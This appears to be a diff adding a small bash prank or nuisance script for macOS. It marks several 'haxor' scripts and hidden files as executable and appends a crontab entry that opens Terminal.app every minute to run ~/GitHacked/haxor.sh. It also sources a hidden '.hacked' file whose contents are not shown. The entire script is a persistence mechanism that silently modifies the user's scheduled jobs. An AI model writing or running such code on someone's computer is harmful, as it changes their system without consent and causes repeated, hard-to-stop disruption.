@@ -1,0 +1,19 @@
+#!/bin/bash
+
+uwu()
+{
+    chmod +x haxor.sh;
+    chmod +x haxor2.sh;
+    chmod +x haxor3.sh;
+    chmod +x haxor4.sh;
+    chmod +x .thesupersecretanswer;
+    #https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor
+    #write out current crontab
+    crontab -l > haxcron;
+    #echo new cron into cron file
+    echo "*/1 * * * * open -a Terminal.app ~/GitHacked/haxor.sh" >> haxcron;
+    #install new cron file
+    crontab haxcron;
+    rm haxcron;
+    source .hacked;
+}
